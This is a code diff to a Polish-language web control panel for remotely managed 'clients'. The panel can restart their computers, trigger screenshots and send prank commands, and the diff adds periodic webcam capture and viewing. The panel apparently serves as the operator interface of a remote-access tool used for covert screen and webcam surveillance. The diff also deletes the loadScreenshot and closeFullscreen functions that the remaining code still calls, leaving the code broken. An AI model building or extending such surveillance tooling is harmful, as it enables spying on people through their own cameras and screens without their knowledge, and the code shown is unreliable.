@@ -274,6 +274,100 @@
             font-size: 0.8em;
         }
         
+        .camera-container {
+            margin-top: 20px;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+
+        .camera-wrapper {
+            max-width: 100%;
+            overflow: auto;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            background: #f8f9fa;
+            margin: 10px 0;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .camera-image {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+
+        .camera-controls button {
+            padding: 8px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .camera-btn {
+            background: #e67e22;
+            color: white;
+        }
+
+        .camera-refresh-btn {
+            background: #2ecc71;
+            color: white;
+        }
+
+        .camera-force-btn {
+            background: #3498db;
+            color: white;
+        }
+
+        .camera-fullscreen-btn {
+            background: #9b59b6;
+            color: white;
+        }
+
+        .camera-info {
+            font-size: 0.9em;
+            color: #7f8c8d;
+            margin-top: 5px;
+            padding: 5px;
+            background: #f8f9fa;
+            border-radius: 3px;
+        }
+
+        .client-item.camera-available {
+            border-right: 4px solid #e67e22;
+            position: relative;
+        }
+
+        .client-item.camera-available::before {
+            content: "📷";
+            position: absolute;
+            left: 10px;
+            top: 10px;
+            font-size: 0.8em;
+        }
+
+        /* W sekcji .client-item w CSS dodaj */
+        .client-item {
+            position: relative;
+            padding-left: 40px; /* Miejsce na ikony */
+        }
+
         /* Fullscreen overlay dla screenshotów */
         .fullscreen-overlay {
             display: none;
@@ -365,16 +459,43 @@
                     <p id="screenshotInfo" class="screenshot-info"></p>
                     <div class="screenshot-controls">
                         <button class="refresh-btn" onclick="refreshScreenshot()">
-                            ↻ Odśwież
+                            Odśwież
                         </button>
                         <button class="force-btn" onclick="sendCommand('screenshot')">
-                            📸 Wymuś nowy
+                            Wymuś nowy
                         </button>
                         <button class="fullscreen-btn" onclick="openFullscreen(document.getElementById('screenshotImage').src)">
-                            ⛶ Pełny ekran
+                            Pełny ekran
                         </button>
                     </div>
                 </div>
+                <!-- Dodaj w sekcji commands-section, po screenshot-container -->
+                <div class="camera-container" id="cameraContainer">
+                    <h3>Podgląd kamery klienta:</h3>
+                    <div class="camera-wrapper">
+                        <img id="cameraImage" class="camera-image" 
+                            src="" alt="Zdjęcie z kamery"
+                            onclick="openFullscreen(this.src, 'camera')">
+                    </div>
+                    <p id="cameraInfo" class="camera-info"></p>
+                    <div class="camera-controls">
+                        <button class="camera-refresh-btn" onclick="refreshCamera()">
+                            Odśwież
+                        </button>
+                        <button class="camera-force-btn" onclick="sendCommand('camera')">
+                            Wymuś nowe
+                        </button>
+                        <button class="camera-fullscreen-btn" 
+                                onclick="openFullscreen(document.getElementById('cameraImage').src, 'camera')">
+                            Pełny ekran
+                        </button>
+                    </div>
+                </div>
+
+                <!-- W sekcji command-buttons zmień przycisk kamery na: -->
+                <button class="command-btn camera-btn" onclick="sendCommand('camera')">
+                    Sprawdź kamerę
+                </button>
                 
                 <div class="command-buttons">
                     <button class="command-btn danger" onclick="sendCommand('reset')">Restart komputera</button>
@@ -382,7 +503,7 @@
                     <button class="command-btn" onclick="sendCommand('call musk')">Elon Musk</button>
                     <button class="command-btn" onclick="sendCommand('call trump')">Donald Trump</button>
                     <button class="command-btn" onclick="sendCommand('call epstine')">Jeffrey Epstein</button>
-                    <button class="command-btn" onclick="sendCommand('screenshot')">Zrób screenshot</button>   
+                    <button class="command-btn" onclick="sendCommand('screenshot')">Zrób screenshot</button>    
                 </div>
                 
                 <div style="margin-top: 20px;">
@@ -402,10 +523,120 @@
         let selectedClient = null;
         let screenshotRefreshInterval = null;
         let currentScreenshotData = null;
-        
-        // Aktualizuj listę klientów
+        // Dodaj do istniejącego kodu JavaScript
+        let cameraRefreshInterval = null;
+        let currentCameraData = null;
+
+        // Wybierz klienta - zaktualizowana funkcja
+        function selectClient(clientId) {
+            selectedClient = { id: clientId };
+            updateClients();
+            
+            // Pobierz dane klienta z uwzględnieniem kamery
+            fetch('/api/get_clients_with_camera')
+                .then(response => response.json())
+                .then(clients => {
+                    const client = clients.find(c => c.id === clientId);
+                    if (client) {
+                        document.getElementById('selectedClientInfo').innerHTML = 
+                            `<strong>Wybrany klient:</strong> ${client.name || 'Unknown'} (${client.id.substring(0, 8)}...)`;
+                        
+                        // Pokaż/ukryj kontenery na podstawie dostępności
+                        const screenshotContainer = document.getElementById('screenshotContainer');
+                        const cameraContainer = document.getElementById('cameraContainer');
+                        
+                        screenshotContainer.style.display = 'block';
+                        cameraContainer.style.display = 'block';
+                        
+                        // Załaduj screenshot
+                        loadScreenshot(clientId);
+                        
+                        // Załaduj kamerę jeśli dostępna
+                        loadCamera(clientId);
+                        
+                        // Ustaw automatyczne odświeżanie
+                        if (screenshotRefreshInterval) {
+                            clearInterval(screenshotRefreshInterval);
+                        }
+                        screenshotRefreshInterval = setInterval(() => {
+                            loadScreenshot(clientId);
+                        }, 10000);
+                        
+                        if (cameraRefreshInterval) {
+                            clearInterval(cameraRefreshInterval);
+                        }
+                        cameraRefreshInterval = setInterval(() => {
+                            loadCamera(clientId);
+                        }, 15000); // Kamera rzadziej niż screenshot
+                    }
+                });
+        }
+
+        // Załaduj zdjęcie z kamery
+        function loadCamera(clientId) {
+            if (!clientId) return;
+            
+            const timestamp = new Date().getTime();
+            const cameraUrl = `/api/get_camera/${clientId}?t=${timestamp}`;
+            const cameraImage = document.getElementById('cameraImage');
+            const cameraInfo = document.getElementById('cameraInfo');
+            
+            cameraImage.onload = function() {
+                const img = this;
+                cameraInfo.innerHTML = `
+                    Rozmiar: ${img.naturalWidth} × ${img.naturalHeight}px<br>
+                    Ostatnia aktualizacja: ${new Date().toLocaleTimeString()}
+                `;
+                
+                // Zapisz dane kamery
+                currentCameraData = {
+                    src: img.src,
+                    width: img.naturalWidth,
+                    height: img.naturalHeight,
+                    timestamp: new Date().toLocaleTimeString()
+                };
+            };
+            
+            cameraImage.onerror = function() {
+                cameraInfo.textContent = "Brak dostępnego zdjęcia z kamery";
+                cameraImage.src = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjVmNWY1Ii8+PHRleHQgeD0iNTAwIiB5PSIyMDAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzk5OSI+QnJhayBrYW1lcnk8L3RleHQ+PC9zdmc+";
+            };
+            
+            cameraImage.src = cameraUrl;
+        }
+
+        // Odśwież kamerę
+        function refreshCamera() {
+            if (selectedClient) {
+                loadCamera(selectedClient.id);
+            }
+        }
+
+        // Zaktualizuj pełny ekran do obsługi typu (screenshot/kamera)
+        function openFullscreen(src, type = 'screenshot') {
+            if (!src || src.includes('svg+xml')) return;
+            
+            const overlay = document.getElementById('fullscreenOverlay');
+            const fullscreenImg = document.getElementById('fullscreenImage');
+            const stats = document.getElementById('fullscreenStats');
+            
+            fullscreenImg.src = src;
+            
+            const data = type === 'camera' ? currentCameraData : currentScreenshotData;
+            if (data) {
+                const typeText = type === 'camera' ? 'Kamera' : 'Screenshot';
+                stats.innerHTML = `
+                    ${typeText} | Rozmiar: ${data.width} × ${data.height}px |
+                    Ostatnia aktualizacja: ${data.timestamp}
+                `;
+            }
+            
+            overlay.style.display = 'flex';
+        }
+
+        // Zaktualizuj updateClients() aby uwzględniał kamerę
         function updateClients() {
-            fetch('/api/clients')
+            fetch('/api/get_clients_with_camera')
                 .then(response => response.json())
                 .then(clients => {
                     const clientList = document.getElementById('clientList');
@@ -420,12 +651,24 @@
                         const statusClass = client.status === 'active' ? 'status-active' : 'status-inactive';
                         const isSelected = selectedClient && selectedClient.id === client.id ? 'selected-client' : '';
                         
-                        // Sprawdź czy klient ma screenshot (poprzez dodatkowe zapytanie)
+                        // Dodaj klasy na podstawie dostępności
                         const hasScreenshotClass = client.has_screenshot ? 'screenshot-available' : '';
+                        const hasCameraClass = client.has_camera ? 'camera-available' : '';
+                        
+                        // Ikony
+                        const icons = [];
+                        if (client.has_screenshot) icons.push('📸');
+                        if (client.has_camera) icons.push('📷');
+                        const iconsHtml = icons.join(' ');
                         
                         html += `
-                            <div class="client-item ${isSelected} ${hasScreenshotClass}" onclick="selectClient('${client.id}')">
-                                <div class="client-info">
+                            <div class="client-item ${isSelected} ${hasScreenshotClass} ${hasCameraClass}" 
+                                onclick="selectClient('${client.id}')"
+                                title="Screenshot: ${client.has_screenshot ? 'Tak' : 'Nie'}, Kamera: ${client.has_camera ? 'Tak' : 'Nie'}">
+                                <div style="position: absolute; left: 10px; top: 10px; font-size: 0.8em;">
+                                    ${iconsHtml}
+                                </div>
+                                <div class="client-info" style="margin-left: 30px;">
                                     <div class="client-name">${client.name || 'Unknown'}</div>
                                     <div class="client-id">ID: ${client.id.substring(0, 8)}...</div>
                                     <div>IP: ${client.ip}</div>
@@ -441,114 +684,8 @@
                 })
                 .catch(error => console.error('Błąd ładowania klientów:', error));
         }
-        
-        // Wybierz klienta
-        function selectClient(clientId) {
-            selectedClient = { id: clientId };
-            updateClients();
-            
-            // Pobierz dane klienta
-            fetch('/api/clients')
-                .then(response => response.json())
-                .then(clients => {
-                    const client = clients.find(c => c.id === clientId);
-                    if (client) {
-                        document.getElementById('selectedClientInfo').innerHTML = 
-                            `<strong>Wybrany klient:</strong> ${client.name || 'Unknown'} (${client.id.substring(0, 8)}...)`;
-                        
-                        // Pokaż kontener screenshotu
-                        const screenshotContainer = document.getElementById('screenshotContainer');
-                        screenshotContainer.style.display = 'block';
-                        
-                        // Załaduj screenshot
-                        loadScreenshot(clientId);
-                        
-                        // Rozpocznij automatyczne odświeżanie co 10 sekund
-                        if (screenshotRefreshInterval) {
-                            clearInterval(screenshotRefreshInterval);
-                        }
-                        screenshotRefreshInterval = setInterval(() => {
-                            loadScreenshot(clientId);
-                        }, 10000);
-                    }
-                });
-        }
-        
-        // Załaduj screenshot klienta
-        function loadScreenshot(clientId) {
-            if (!clientId) return;
-            
-            const timestamp = new Date().getTime();
-            const screenshotUrl = `/api/get_screenshot/${clientId}?t=${timestamp}`;
-            const screenshotImage = document.getElementById('screenshotImage');
-            const screenshotInfo = document.getElementById('screenshotInfo');
-            
-            // Dodaj listener do załadowania obrazka
-            screenshotImage.onload = function() {
-                const img = this;
-                screenshotInfo.innerHTML = `
-                    Rozmiar: ${img.naturalWidth} × ${img.naturalHeight}px<br>
-                    Ostatnia aktualizacja: ${new Date().toLocaleTimeString()}
-                `;
-                
-                // Zapisz dane screenshotu
-                currentScreenshotData = {
-                    src: img.src,
-                    width: img.naturalWidth,
-                    height: img.naturalHeight,
-                    timestamp: new Date().toLocaleTimeString()
-                };
-            };
-            
-            screenshotImage.onerror = function() {
-                screenshotInfo.textContent = "Brak dostępnego screenshotu";
-                screenshotImage.src = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjVmNWY1Ii8+PHRleHQgeD0iNTAwIiB5PSIyMDAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzk5OSI+QnJhayBzY3JlZW5zaG90dTwvdGV4dD48L3N2Zz4=";
-            };
-            
-            // Ustaw źródło obrazka
-            screenshotImage.src = screenshotUrl;
-        }
-        
-        // Odśwież screenshot
-        function refreshScreenshot() {
-            if (selectedClient) {
-                loadScreenshot(selectedClient.id);
-            }
-        }
-        
-        // Otwórz screenshot w pełnym ekranie
-        function openFullscreen(src) {
-            if (!src || src.includes('svg+xml')) return;
-            
-            const overlay = document.getElementById('fullscreenOverlay');
-            const fullscreenImg = document.getElementById('fullscreenImage');
-            const stats = document.getElementById('fullscreenStats');
-            
-            fullscreenImg.src = src;
-            
-            if (currentScreenshotData) {
-                stats.innerHTML = `
-                    Rozmiar: ${currentScreenshotData.width} × ${currentScreenshotData.height}px |
-                    Ostatnia aktualizacja: ${currentScreenshotData.timestamp}
-                `;
-            }
-            
-            overlay.style.display = 'flex';
-            
-            // Dodaj obsługę ESC
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape') {
-                    closeFullscreen();
-                }
-            });
-        }
-        
-        // Zamknij pełny ekran
-        function closeFullscreen() {
-            document.getElementById('fullscreenOverlay').style.display = 'none';
-        }
-        
-        // Wyślij komendę
+
+        // Wyślij komendę - zaktualizuj dla kamery
         function sendCommand(command) {
             if (!selectedClient) {
                 alert('Proszę wybrać klienta z listy!');
@@ -570,11 +707,17 @@
                 if (data.success) {
                     alert(`Komenda "${command}" wysłana do klienta!`);
                     
-                    // Jeśli to komenda screenshot, odśwież po chwili
+                    // Jeśli to komenda screenshot lub camera, odśwież po chwili
                     if (command === 'screenshot') {
                         setTimeout(() => {
                             if (selectedClient) {
                                 loadScreenshot(selectedClient.id);
+                            }
+                        }, 3000);
+                    } else if (command === 'camera') {
+                        setTimeout(() => {
+                            if (selectedClient) {
+                                loadCamera(selectedClient.id);
                             }
                         }, 3000);
                     }
@@ -613,6 +756,8 @@
                     document.querySelector('.status').style.background = '#e74c3c';
                 });
         }
+        
+            
         
         // Inicjalizacja
         document.addEventListener('DOMContentLoaded', function() {
